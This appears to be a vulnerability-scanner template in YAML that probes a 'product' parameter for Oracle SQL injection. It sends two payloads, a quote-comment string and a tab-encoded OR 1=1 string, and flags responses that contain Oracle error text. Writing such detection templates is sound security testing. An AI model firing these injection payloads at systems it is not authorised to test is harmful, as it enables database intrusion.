id: sqli6-oracle-18
name: 'SQLi oracle probe in product'
severity: high
type: active
tags:
  - sqli
  - injection
  - oracle
description: 'Triggers oracle error via product'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      product:
        - 'admin"--'
        - '''%09OR%091=1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ORA-'
          - 'Oracle error'
